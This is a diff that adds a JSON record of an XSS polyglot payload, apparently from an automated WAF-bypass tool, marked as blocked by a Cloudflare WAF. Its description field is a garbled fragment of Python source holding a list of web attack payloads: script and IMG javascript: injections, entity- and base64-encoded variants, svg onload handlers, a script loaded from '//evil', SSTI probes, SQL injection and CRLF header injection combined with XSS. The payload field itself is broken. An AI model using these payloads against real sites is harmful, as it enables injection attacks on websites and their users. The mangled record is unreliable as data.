@@ -1,0 +1,21 @@
+{
+  "category": "xss",
+  "subcategory": "polyglot",
+  "count": 1,
+  "payloads": [
+    {
+      "id": "xss-0218",
+      "category": "xss",
+      "subcategory": "polyglot",
+      "payload": "alert(1)\")()}}",
+      "description": "<ScRiPt>alert(1)</sCrIpT>\",\n    \"<SCRIPT SRC=//evil></SCRIPT>\",\n    \"<IMG SRC=JaVaScRiPt:alert(1)>\",\n    \"<IMG SRC=javascript:alert(1)>\",\n    \"<IMG SRC=`javascript:alert(1)`>\",\n    \"<IMG SRC=\\\"javascript:alert(1)\\\">\",\n    \"<IMG \\\"\\\"\\\"><SCRIPT>alert(1)</SCRIPT>\\\">\",\n    \"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\",\n    \"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>\",\n    \"<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>\",\n    \"<svg/onload=alert(1)//\",\n    '\"><svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',\n    '<svg><script>alert(1)</script>',\n    '<math><mi><mg src=x onerror=alert(1)>',\n    '<svg><animatetransform onbegin=alert(1)>',\n    'data:text/html,<script>alert(1)</script>',\n    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',\n    # SSTI polyglots\n    '{{7*7}}<svg/onload=alert(1)>${{7*7}}',\n    '{{alert(1)}}',\n    '${alert(1)}<%=alert(1)%>',\n    # SQLi + XSS\n    \"1' OR '1'='1'--<svg/onload=alert(1)>\",\n    '1\" OR \"1\"=\"1\"--<svg/onload=alert(1)>',\n    \"' UNION SELECT '<svg/onload=alert(1)>'--\",\n    # CRLF + XSS\n    '%0d%0a%0d%0a<svg/onload=alert(1)>',\n    'X%0d%0aContent-Type: text/html%0d%0a%0d%0a<svg/onload=alert(1)>',\n    # XML\n    '<?xml version=\"1.0\"?><svg/onload=alert(1)>',\n    ",
+      "technique": "polyglot",
+      "source_file": "waf_round68_mass.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
